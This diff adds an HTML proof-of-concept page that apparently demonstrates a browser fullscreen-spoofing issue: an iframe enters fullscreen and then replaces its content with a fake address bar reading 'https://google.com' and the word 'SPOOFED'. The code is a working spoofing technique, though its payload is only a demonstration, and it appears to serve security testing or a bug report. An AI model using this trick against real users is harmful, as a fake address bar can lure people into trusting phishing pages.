@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>PoC C - Iframe Fullscreen</title>
+</head>
+<body>
+
+<h2>Iframe Fullscreen Spoof</h2>
+<button onclick="run()">Run</button>
+
+<script>
+function run() {
+  const iframe = document.createElement("iframe");
+  iframe.allow = "fullscreen";
+  iframe.style.width = "100%";
+  iframe.style.height = "400px";
+
+  iframe.srcdoc = `
+    <button onclick="go()">Go Fullscreen</button>
+    <script>
+      function go() {
+        document.documentElement.requestFullscreen();
+      }
+
+      document.addEventListener("fullscreenchange", () => {
+        document.body.innerHTML = \`
+          <div style="background:#000;color:#fff;padding:10px;">
+            https://google.com
+          </div>
+          <h1>SPOOFED</h1>
+        \`;
+      });
+    <\/script>
+  `;
+
+  document.body.appendChild(iframe);
+}
+</script>
+
+</body>
+</html>
